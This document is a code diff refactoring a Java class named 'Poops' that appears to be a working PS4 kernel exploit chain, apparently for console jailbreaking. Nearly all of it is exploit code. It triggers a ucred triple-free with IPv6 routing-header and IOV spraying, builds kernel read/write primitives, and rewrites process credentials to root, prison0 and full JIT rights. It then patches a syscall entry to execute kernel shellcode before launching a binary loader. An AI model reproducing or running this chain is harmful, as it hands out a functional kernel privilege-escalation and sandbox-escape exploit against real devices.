@@ -47,6 +47,9 @@ public class Poops {
     private static final int F_SETFL = 4;
     private static final int O_NONBLOCK = 4;
 
+    private static final int WORKER_TIMEOUT_MS = 1000;
+    private static final int WORKER_MAX_WAIT_MS = 10000;
+
     // system methods
     private static long dup;
     private static long close;
@@ -181,7 +184,8 @@ public class Poops {
     }
 
     private static int getsockopt(int s, int level, int optname, Buffer optval, Int32 optlen) {
-        return (int) Helper.api.call(getsockopt, s, level, optname, optval != null ? optval.address() : 0, optlen != null ? optlen.address() : 0);
+        return (int) Helper.api.call(getsockopt, s, level, optname, optval != null ? optval.address() : 0,
+                optlen != null ? optlen.address() : 0);
     }
 
     private static int setsockopt(int s, int level, int optname, Buffer optval, int optlen) {
@@ -211,7 +215,7 @@ public class Poops {
     }
 
     private static int cpuset_setaffinity(int level, int which, long id, long setsize, Buffer mask) {
-        return (int)api.call(cpuset_setaffinity, level, which, id, setsize, mask != null ? mask.address() : 0);
+        return (int) api.call(cpuset_setaffinity, level, which, id, setsize, mask != null ? mask.address() : 0);
     }
 
     public static void cleanup() {
@@ -227,7 +231,9 @@ public class Poops {
                 iovThreads[i].interrupt();
                 try {
                     iovThreads[i].join();
-                } catch (Exception e) {}
+                } catch (InterruptedException e) {
+                    console.println("Failed to join IOV thread " + i);
+                }
             }
         }
         for (int i = 0; i < UIO_THREAD_NUM; i++) {
@@ -235,11 +241,12 @@ public class Poops {
                 uioThreads[i].interrupt();
                 try {
                     uioThreads[i].join();
-                } catch (Exception e) {}
+                } catch (Exception e) {
+                }
             }
         }
         if (previousCore >= 0 && previousCore != 4) {
-            //console.println("back to core " + previousCore);
+            // console.println("back to core " + previousCore);
             Helper.pinToCore(previousCore);
             previousCore = -1;
         }
@@ -324,8 +331,7 @@ public class Poops {
             read(uioSs0, leakBuffers[i], leakBuffers[i].size());
             if (leakBuffers[i].getLong(0x00) != 0x4141414141414141L) {
                 triplets[1] = findTriplet(triplets[0], -1, UAF_TRIES);
-                if (triplets[1] == -1)
-                {
+                if (triplets[1] == -1) {
                     console.println("kreadSlow triplet failure 1");
                     return null;
                 }
@@ -335,8 +341,7 @@ public class Poops {
         uioState.waitForFinished();
         write(iovSs1, tmp, Int8.SIZE);
         triplets[2] = findTriplet(triplets[0], triplets[1], UAF_TRIES);
-        if (triplets[2] == -1)
-        {
+        if (triplets[2] == -1) {
             console.println("kreadSlow triplet failure 2");
             return null;
         }
@@ -382,16 +387,14 @@ public class Poops {
             write(uioSs1, buffer, buffer.size());
         }
         triplets[1] = findTriplet(triplets[0], -1, UAF_TRIES);
-        if (triplets[1] == -1)
-        {
+        if (triplets[1] == -1) {
             console.println("kwriteSlow triplet failure 1");
             return false;
         }
         uioState.waitForFinished();
         write(iovSs1, tmp, Int8.SIZE);
         triplets[2] = findTriplet(triplets[0], triplets[1], UAF_TRIES);
-        if (triplets[2] == -1)
-        {
+        if (triplets[2] == -1) {
             console.println("kwriteSlow triplet failure 2");
             return false;
         }
@@ -500,6 +503,13 @@ public class Poops {
             fcntl(victimRpipeFd, F_SETFL, O_NONBLOCK);
             fcntl(victimWpipeFd, F_SETFL, O_NONBLOCK);
 
+            // console.println("Performing setup...");
+            // if (!performSetup()) {
+            //     console.println("Setup failed");
+            //     return false;
+            // }
+            // console.println("Setup completed successfully");
+
             return true;
         } catch (Exception e) {
             console.println("exception during performSetup");
@@ -537,18 +547,12 @@ public class Poops {
                 }
                 sprayRthdr.putInt(0x04, RTHDR_TAG | i);
                 setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen);
-            }
-
-            for (int i = 0; i < ipv6Socks.length; i++) {
-                if (i == master || i == other) {
-                    continue;
-                }
                 leakRthdrLen.set(Int64.SIZE);
                 getRthdr(ipv6Socks[master], leakRthdr, leakRthdrLen);
-                int val = leakRthdr.getInt(0x04);
-                int j = val & 0xFFFF;
-                if ((val & 0xFFFF0000) == RTHDR_TAG && j != master && j != other) {
-                    return j;
+                int tagValue = leakRthdr.getInt(0x04);
+                int candidate = tagValue & 0xFFFF;
+                if ((tagValue & 0xFFFF0000) == RTHDR_TAG && candidate != master && candidate != other) {
+                    return candidate;
                 }
             }
         }
@@ -655,8 +659,7 @@ public class Poops {
                 close(kq);
             }
 
-            if (timeout <= 0)
-            {
+            if (timeout <= 0) {
                 console.println("kqueue realloc failed");
                 return false;
             }
@@ -667,8 +670,7 @@ public class Poops {
 
             // Find triplet.
             triplets[1] = findTriplet(triplets[0], triplets[2], UAF_TRIES);
-            if (triplets[1] == -1)
-            {
+            if (triplets[1] == -1) {
                 console.println("kqueue triplets 1 failed ");
                 return false;
             }
@@ -699,9 +701,10 @@ public class Poops {
             }
 
             removeUafFile();
-        } catch (Exception e)
-        {
+        } catch (Exception e) {
             console.println("exception during stage 1");
+            console.println("Error: " + e.getMessage());
+            e.printStackTrace(console);
             return false;
         }
         return true;
@@ -733,143 +736,201 @@ public class Poops {
     }
 
     private static boolean escapeSandbox() {
-        // get curproc
-        Int32Array pipeFd = new Int32Array(2);
-        pipe(pipeFd);
-        
-        Int32 currPid = new Int32();
-        int curpid = getpid();
-        currPid.set(curpid);
-        ioctl(pipeFd.get(0), 0x8004667CL, currPid.address());
+        try {
+            // Constants for offsets and masks
+            final long MASK_HIGH_BITS = 0xFFFFFFFF00000000L;
+            final long OFFSET_P_UCRED = 0x40;
+            final long IOCTL_REQUEST = 0x8004667CL;
 
-        long fp = fget(pipeFd.get(0));
-        long f_data = kread64(fp + 0x00);
-        long pipe_sigio = kread64(f_data + 0xd0);
-        long curproc = kread64(pipe_sigio);
-        long p = curproc;
+            // Create a pipe and retrieve the current process ID
+            Int32Array pipeFd = new Int32Array(2);
+            if (pipe(pipeFd) != 0) {
+                console.println("Failed to create pipe.");
+                return false;
+            }
 
-        // get allproc
-        while ((p & 0xFFFFFFFF00000000L) != 0xFFFFFFFF00000000L) {
-            p = kread64(p + 0x08); // p_list.le_prev
-        }
+            Int32 currPid = new Int32();
+            int curpid = getpid();
+            currPid.set(curpid);
+            ioctl(pipeFd.get(0), IOCTL_REQUEST, currPid.address());
 
-        allproc = p;
+            // Retrieve the current process structure
+            long fp = fget(pipeFd.get(0));
+            long f_data = kread64(fp);
+            long pipe_sigio = kread64(f_data + 0xd0);
+            long curproc = kread64(pipe_sigio);
+            if (curproc == 0) {
+                console.println("Failed to retrieve curproc.");
+                close(pipeFd.get(1));
+                close(pipeFd.get(0));
+                return false;
+            }
 
-        close(pipeFd.get(1));
-        close(pipeFd.get(0));
+            // Traverse the process list to find allproc
+            long p = curproc;
+            while ((p & MASK_HIGH_BITS) != MASK_HIGH_BITS) {
+                p = kread64(p + 0x08); // p_list.le_prev
+            }
+            allproc = p;
 
-        kBase = kl_lock - KernelOffset.getPS4Offset("KL_LOCK");
+            // Close the pipe
+            close(pipeFd.get(1));
+            close(pipeFd.get(0));
 
-        long OFFSET_P_UCRED = 0x40;
-        long procFd = kread64(curproc + KernelOffset.PROC_FD);
-        long ucred = kread64(curproc + OFFSET_P_UCRED);
-        
-        if ((procFd >>> 48) != 0xFFFF) {
-            console.print("bad procfd");
+            // Calculate kernel base
+            kBase = kl_lock - KernelOffset.getPS4Offset("KL_LOCK");
+
+            // Retrieve and validate credentials
+            long procFd = kread64(curproc + KernelOffset.PROC_FD);
+            long ucred = kread64(curproc + OFFSET_P_UCRED);
+            if (!isValidPointer(procFd) || !isValidPointer(ucred)) {
+                console.println("Invalid procFd or ucred.");
+                return false;
+            }
+
+            // Modify credentials
+            kwrite32(ucred + 0x04, 0); // cr_uid
+            kwrite32(ucred + 0x08, 0); // cr_ruid
+            kwrite32(ucred + 0x0C, 0); // cr_svuid
+            kwrite32(ucred + 0x10, 1); // cr_ngroups
+            kwrite32(ucred + 0x14, 0); // cr_rgid
+
+            // Set prison0
+            long prison0 = getPrison0();
+            if (!isValidPointer(prison0)) {
+                console.println("Invalid prison0.");
+                return false;
+            }
+            kwrite64(ucred + 0x30, prison0);
+
+            // Add JIT privileges
+            kwrite64(ucred + 0x60, -1);
+            kwrite64(ucred + 0x68, -1);
+
+            // Set root vnode
+            long rootvnode = getRootVnode(0x10);
+            if (!isValidPointer(rootvnode)) {
+                console.println("Invalid rootvnode.");
+                return false;
+            }
+            kwrite64(procFd + 0x10, rootvnode); // fd_rdir
+            kwrite64(procFd + 0x18, rootvnode); // fd_jdir
+
+            return true;
+        } catch (Exception e) {
+            console.println("Exception during escapeSandbox: " + e.getMessage());
+            e.printStackTrace(console);
             return false;
         }
-        if ((ucred >>> 48) != 0xFFFF) {
-            console.print("bad ucred");
-            return false;
-        }
-        
-        kwrite32(ucred + 0x04, 0); // cr_uid
-        kwrite32(ucred + 0x08, 0); // cr_ruid
-        kwrite32(ucred + 0x0C, 0); // cr_svuid
-        kwrite32(ucred + 0x10, 1); // cr_ngroups
-        kwrite32(ucred + 0x14, 0); // cr_rgid
+    }
 
-        long prison0 = getPrison0();
-        if ((prison0 >>> 48) != 0xFFFF) {
-            console.print("bad prison0");
-            return false;
-        }
-        kwrite64(ucred + 0x30, prison0);
-
-        // Add JIT privileges
-        kwrite64(ucred + 0x60, -1);
-        kwrite64(ucred + 0x68, -1);
-
-        long rootvnode = getRootVnode(0x10);
-        if ((rootvnode >>> 48) != 0xFFFF) {
-            console.print("bad rootvnode");
-            return false;
-        }
-        kwrite64(procFd + 0x10, rootvnode); // fd_rdir
-        kwrite64(procFd + 0x18, rootvnode); // fd_jdir
-        return true;
+    private static boolean isValidPointer(long ptr) {
+        return (ptr >>> 48) == 0xFFFF;
     }
 
     private static boolean triggerUcredTripleFree() {
         try {
-            Buffer setBuf = new Buffer(8);
-            Buffer clearBuf = new Buffer(8);
+            final int BUFFER_SIZE = 8;
+            final int ITERATIONS = 32;
+
+            // Prepare buffers
+            Buffer setBuf = new Buffer(BUFFER_SIZE);
+            Buffer clearBuf = new Buffer(BUFFER_SIZE);
             msgIov.putLong(0x00, 1); // iov_base
             msgIov.putLong(0x08, Int8.SIZE); // iov_len
+
+            // Create a dummy socket and set the queue
             int dummySock = socket(AF_UNIX, SOCK_STREAM, 0);
             setBuf.putInt(0x00, dummySock);
             __sys_netcontrol(-1, NET_CONTROL_NETEVENT_SET_QUEUE, setBuf, setBuf.size());
             close(dummySock);
+
+            // Create the UAF socket and clear the queue
             setuid(1);
             uafSock = socket(AF_UNIX, SOCK_STREAM, 0);
             setuid(1);
             clearBuf.putInt(0x00, uafSock);
             __sys_netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clearBuf, clearBuf.size());
-            for (int i = 0; i < 32; i++) {
-                iovState.signalWork(0);
-                sched_yield();
-                write(iovSs1, tmp, Int8.SIZE);
-                iovState.waitForFinished();
-                read(iovSs0, tmp, Int8.SIZE);
+
+            // Perform IOV spraying
+            for (int i = 0; i < ITERATIONS; i++) {
+                performIovSpray();
             }
+
+            // Close the duplicate UAF socket
             close(dup(uafSock));
-            if (!findTwins(TWIN_TRIES))
-            {
-                console.println("twins failed");
+
+            // Find twins
+            if (!findTwins(TWIN_TRIES)) {
+                console.println("Twins not found. Aborting.");
                 return false;
             }
 
+            // Free one of the twins
             freeRthdr(ipv6Socks[twins[1]]);
-            int timeout = UAF_TRIES;
-            while (timeout-- > 0) {
-                iovState.signalWork(0);
-                sched_yield();
-                leakRthdrLen.set(Int64.SIZE);
-                getRthdr(ipv6Socks[twins[0]], leakRthdr, leakRthdrLen);
-                if (leakRthdr.getInt(0x00) == 1) {
-                    break;
-                }
-                write(iovSs1, tmp, Int8.SIZE);
-                iovState.waitForFinished();
-                read(iovSs0, tmp, Int8.SIZE);
-            }
-            if (timeout <= 0)
-            {
-                console.println("iov reclaim failed");
+
+            // Reclaim IOV
+            if (!reclaimIov()) {
+                console.println("IOV reclaim failed. Aborting.");
                 return false;
             }
+
+            // Find triplets
             triplets[0] = twins[0];
             close(dup(uafSock));
-            triplets[1] = findTriplet(triplets[0], -1, UAF_TRIES);
-            if (triplets[1] == -1)
-            {
-                console.println("triplets 1 failed");
+            if (!findTriplets()) {
                 return false;
             }
-            write(iovSs1, tmp, Int8.SIZE);
-            triplets[2] = findTriplet(triplets[0], triplets[1], UAF_TRIES);
-            if (triplets[2] == -1)
-            {
-                console.println("triplets 2 failed");
-                return false;
-            }
-            iovState.waitForFinished();
-            read(iovSs0, tmp, Int8.SIZE);
-        } catch (Exception e)
-        {
-            console.println("exception during stage 0");
+
+            return true;
+        } catch (Exception e) {
+            console.println("Exception during stage 0: " + e.getMessage());
+            e.printStackTrace(console);
             return false;
         }
+    }
+
+    private static void performIovSpray() throws InterruptedException {
+        iovState.signalWork(0);
+        sched_yield();
+        write(iovSs1, tmp, Int8.SIZE);
+        iovState.waitForFinished();
+        read(iovSs0, tmp, Int8.SIZE);
+    }
+
+    private static boolean reclaimIov() throws InterruptedException {
+        int timeout = UAF_TRIES;
+        while (timeout-- > 0) {
+            iovState.signalWork(0);
+            sched_yield();
+            leakRthdrLen.set(Int64.SIZE);
+            getRthdr(ipv6Socks[twins[0]], leakRthdr, leakRthdrLen);
+            if (leakRthdr.getInt(0x00) == 1) {
+                return true;
+            }
+            write(iovSs1, tmp, Int8.SIZE);
+            iovState.waitForFinished();
+            read(iovSs0, tmp, Int8.SIZE);
+        }
+        return false;
+    }
+
+    private static boolean findTriplets() throws InterruptedException {
+        triplets[1] = findTriplet(triplets[0], -1, UAF_TRIES);
+        if (triplets[1] == -1) {
+            console.println("Triplets 1 not found. Aborting.");
+            return false;
+        }
+
+        write(iovSs1, tmp, Int8.SIZE);
+        triplets[2] = findTriplet(triplets[0], triplets[1], UAF_TRIES);
+        if (triplets[2] == -1) {
+            console.println("Triplets 2 not found. Aborting.");
+            return false;
+        }
+
+        iovState.waitForFinished();
+        read(iovSs0, tmp, Int8.SIZE);
         return true;
     }
 
@@ -877,48 +938,70 @@ public class Poops {
         try {
             byte[] shellcode = KernelOffset.getKernelPatchesShellcode();
             if (shellcode.length == 0) {
+                console.println("Shellcode is empty. Aborting kernel patching.");
                 return false;
             }
 
-            long sysent661Addr = kBase + KernelOffset.getPS4Offset("SYSENT_661_OFFSET");
-            long mappingAddr = 0x920100000L;
-            long shadowMappingAddr = 0x926100000L;
+            final long SYSENT_661_ADDR = kBase + KernelOffset.getPS4Offset("SYSENT_661_OFFSET");
+            final long MAPPING_ADDR = 0x920100000L;
+            final long SHADOW_MAPPING_ADDR = 0x926100000L;
 
-            int syNarg = kread32(sysent661Addr);
-            long syCall = kread64(sysent661Addr + 8);
-            int syThrcnt = kread32(sysent661Addr + 0x2c);
-            kwrite32(sysent661Addr, 2);
-            kwrite64(sysent661Addr + 8, kBase + KernelOffset.getPS4Offset("JMP_RSI_GADGET"));
-            kwrite32(sysent661Addr + 0x2c, 1);
-            
-            int PROT_READ = 0x1;
-            int PROT_WRITE = 0x2;
-            int PROT_EXEC = 0x4;
-            int PROT_RW = PROT_READ | PROT_WRITE;
-            int PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC;
-            
-            int alignedMemsz = 0x10000;
+            // Backup original sysent values
+            int originalSyNarg = kread32(SYSENT_661_ADDR);
+            long originalSyCall = kread64(SYSENT_661_ADDR + 8);
+            int originalSyThrcnt = kread32(SYSENT_661_ADDR + 0x2c);
+
+            // Patch sysent to point to the kernel patch shellcode
+            kwrite32(SYSENT_661_ADDR, 2);
+            kwrite64(SYSENT_661_ADDR + 8, kBase + KernelOffset.getPS4Offset("JMP_RSI_GADGET"));
+            kwrite32(SYSENT_661_ADDR + 0x2c, 1);
+
+            final int PROT_READ = 0x1;
+            final int PROT_WRITE = 0x2;
+            final int PROT_EXEC = 0x4;
+            final int PROT_RW = PROT_READ | PROT_WRITE;
+            final int PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC;
+            final int ALIGNED_MEM_SIZE = 0x10000;
             // create shm with exec permission
-            long execHandle = Helper.syscall(Helper.SYS_JITSHM_CREATE, 0L, (long)alignedMemsz, (long)PROT_RWX);
-            // create shm alias with write permission
-            long writeHandle = Helper.syscall(Helper.SYS_JITSHM_ALIAS, execHandle, (long)PROT_RW);
-            // map shadow mapping and write into it
-            Helper.syscall(Helper.SYS_MMAP, shadowMappingAddr, (long)alignedMemsz, (long)PROT_RW, 0x11L, writeHandle, 0L);
-            for (int i = 0; i < shellcode.length; i++) {
-                api.write8(shadowMappingAddr + i, shellcode[i]);
+            long execHandle = Helper.syscall(Helper.SYS_JITSHM_CREATE, 0L, (long) ALIGNED_MEM_SIZE, (long) PROT_RWX);
+            if (execHandle <= 0) {
+                console.println("Failed to create executable shared memory.");
+                return false;
             }
-            // map executable segment
-            Helper.syscall(Helper.SYS_MMAP, mappingAddr, (long)alignedMemsz, (long)PROT_RWX, 0x11L, execHandle, 0L);
-            Helper.syscall(Helper.SYS_KEXEC, mappingAddr);
-            kwrite32(sysent661Addr, syNarg);
-            kwrite64(sysent661Addr + 8, syCall);
-            kwrite32(sysent661Addr + 0x2c, syThrcnt);
-            Helper.syscall(Helper.SYS_CLOSE, writeHandle);
-        } catch (Exception e)
-        {
+            // create shm alias with write permission
+            long writeHandle = Helper.syscall(Helper.SYS_JITSHM_ALIAS, execHandle, (long) PROT_RW);
+            if (writeHandle <= 0) {
+                console.println("Failed to create writable alias for shared memory.");
+                Helper.syscall(Helper.SYS_CLOSE, execHandle);
+                return false;
+            }
 
+            // Map the shadow memory and write the shellcode into it
+            Helper.syscall(Helper.SYS_MMAP, SHADOW_MAPPING_ADDR, (long) ALIGNED_MEM_SIZE, (long) PROT_RW, 0x11L,
+                    writeHandle, 0L);
+            for (int i = 0; i < shellcode.length; i++) {
+                api.write8(SHADOW_MAPPING_ADDR + i, shellcode[i]);
+            }
+
+            // Map the executable memory and execute the shellcode
+            Helper.syscall(Helper.SYS_MMAP, MAPPING_ADDR, (long) ALIGNED_MEM_SIZE, (long) PROT_RWX, 0x11L, execHandle,
+                    0L);
+            Helper.syscall(Helper.SYS_KEXEC, MAPPING_ADDR);
+
+            // Restore original sysent values
+            kwrite32(SYSENT_661_ADDR, originalSyNarg);
+            kwrite64(SYSENT_661_ADDR + 8, originalSyCall);
+            kwrite32(SYSENT_661_ADDR + 0x2c, originalSyThrcnt);
+
+            // Close the writable alias handle
+            Helper.syscall(Helper.SYS_CLOSE, writeHandle);
+
+            return true;
+        } catch (Exception e) {
+            console.println("Exception during kernel patching: " + e.getMessage());
+            e.printStackTrace(console);
+            return false;
         }
-        return true;
     }
 
     public static int main(PrintStream cons) {
@@ -932,41 +1015,38 @@ public class Poops {
 
         // perform setup
         console.println("Pre-configuration");
-        if (!performSetup())
-        {
-            console.println("pre-config failure");
-            cleanup();
-            return -3;
-        }
-        console.println("Initial triple free");
-        if (!triggerUcredTripleFree()) {
-            cons.println("triple free failed");
-            cleanup();
-            return -4;
-        }
 
-        // do not print to the console to increase stability here
-        if (!achieveRw(KQUEUE_TRIES)) {
-            cons.println("Leak / RW failed");
-            cleanup();
-            return -6;
-        }
+        try {
+            if (!performSetup()) {
+                console.println("pre-config failure");
+                return -3;
+            }
+            console.println("Initial triple free");
+            if (!triggerUcredTripleFree()) {
+                cons.println("triple free failed");
+                return -4;
+            }
 
-        console.println("Escaping sandbox");
-        if (!escapeSandbox()) {
-            cons.println("Escape sandbox failed");
-            cleanup();
-            return -7;
-        }
+            // do not print to the console to increase stability here
+            if (!achieveRw(KQUEUE_TRIES)) {
+                cons.println("Leak / RW failed");
+                return -6;
+            }
 
-        console.println("Patching system");
-        if (!applyKernelPatchesPS4()) {
-            cons.println("Applying patches failed");
-            cleanup();
-            return -8;
-        }
+            console.println("Escaping sandbox");
+            if (!escapeSandbox()) {
+                cons.println("Escape sandbox failed");
+                return -7;
+            }
 
-        cleanup();
+            console.println("Patching system");
+            if (!applyKernelPatchesPS4()) {
+                cons.println("Applying patches failed");
+                return -8;
+            }
+        } finally {
+            cleanup();
+        }
 
         BinLoader.start();
 
@@ -975,9 +1055,11 @@ public class Poops {
 
     static class IovThread extends Thread {
         private final WorkerState state;
+
         public IovThread(WorkerState state) {
             this.state = state;
         }
+
         public void run() {
             cpusetSetAffinity(4);
             Helper.setRealtimePriority(256);
@@ -996,8 +1078,9 @@ public class Poops {
         private final WorkerState state;
 
         public UioThread(WorkerState state) {
-        this.state = state;
+            this.state = state;
         }
+
         public void run() {
             cpusetSetAffinity(4);
             Helper.setRealtimePriority(256);
@@ -1044,13 +1127,25 @@ public class Poops {
         }
 
         public synchronized void waitForFinished() {
+            long startTime = System.currentTimeMillis();
             while (workersFinishedWork < totalWorkers) {
                 try {
-                    wait();
+                    wait(WORKER_TIMEOUT_MS); // Timeout after 1 second
+                    if (System.currentTimeMillis() - startTime > WORKER_MAX_WAIT_MS) { // 10-second timeout
+                        console.println("Timeout waiting for workers to finish");
+                        break;
+                    }
                 } catch (InterruptedException e) {
-                    // Ignore.
+                    console.println("Interrupted while waiting for workers to finish");
                 }
             }
+            // while (workersFinishedWork < totalWorkers) {
+            // try {
+            // wait();
+            // } catch (InterruptedException e) {
+            // // Ignore.
+            // }
+            // }
 
             workCommand = -1;
         }
